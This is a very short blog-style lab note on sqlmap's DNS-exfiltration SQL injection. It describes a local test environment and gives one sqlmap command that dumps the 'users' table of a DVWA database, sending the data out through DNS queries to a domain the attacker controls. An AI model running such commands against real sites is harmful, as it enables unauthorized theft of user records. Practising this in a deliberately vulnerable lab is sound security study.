---
title: SQLMAP Dns Injection
date: 2016-08-09 13:42:50
tags: sqlmap && dns injection
---

0x01 Environment
```
wampserver  ==> Virtual host->waf.com
sqlmap      ==> sqlmap on win2003
win2003     ==> dns -> 127.0.0.1
```
0x02 Hack fun it
```
> sqlmap.py -u "http://www.example.com/index.php?id=1" --dns-domain="waf.com" -D "dvwa" -T "users" --dump
```